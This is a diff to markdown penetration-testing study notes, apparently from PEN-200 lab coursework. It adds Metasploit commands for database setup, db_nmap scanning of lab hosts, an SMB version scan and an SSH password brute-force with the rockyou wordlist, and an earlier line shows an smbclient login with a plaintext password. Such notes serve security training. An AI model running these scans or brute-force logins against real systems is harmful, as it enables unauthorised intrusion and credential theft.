@@ -1769,7 +1769,51 @@ Reference
   - another shell Connecting to HRSHARES's SMB server through the dnscat2 port forward  
     `kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234`  
 
-### 21. The metassploit framework
+### 21. The metassploit framework  
+**Getting familiar with Metasploit**
+- Creating and initializing the Metasploit database  
+  `sudo msfdb init`
+- Enable postgresql database service  
+  `sudo systemctl enable postgresql`
+- Launch Metasploit Framework > msf6 >  
+  `sudo msfconsole`
+- confirming DB connectivity  
+  `msf6 > db_status` `msf6 > help`
+- Creating workspace  
+  `msf6 > workspace` `msf6 > workspace -a pen200`
+- Using db_nmap to scan BRUTE2  
+  `msf6 > db_nmap -A 192.168.50.202` `msf6 > hosts` `msf6 > services` `msf6 > services -p 8000`
+- help flag for the command 'show'  
+  `show -h`
+- List all auxiliary modules  
+  `msf6 > show auxiliary`
+- Search all SMB auxiliary modules in Metasploit > 56  auxiliary/scanner/smb/smb_version    
+  `msf6 > search type:auxiliary smb`
+- Activate smb_version module  
+  `use 56`
+- info about the smb_version module  
+  `msf6 auxiliary(scanner/smb/smb_version) > info` `msf6 auxiliary(scanner/smb/smb_version) > show options`
+- set option value  
+  `msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202`  
+  `msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS`  
+  `msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts` (Automated fashion)  
+- Execute the auxiliary module  
+  `msf6 auxiliary(scanner/smb/smb_version) > run`
+- Display vulnerabilities identified by Metasploit > SMB Signing Is Not Required  
+  `msf6 auxiliary(scanner/smb/smb_version) > vulns`
+- Display SSH auxiliary module > 15  auxiliary/scanner/ssh/ssh_login  
+  `msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh` `use 15`
+  ```
+  msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+  set USERNAME george
+  set RHOSTS 192.168.50.201
+  set RPORT 2222
+  run
+  creds
+  ```
+- ddd
+- ddd
+- ddd
 ### 22. Active directory introduction and enumeration
 ### 23. Attacking active drectiory authentication
 ### 24. Lateral movement in active directory
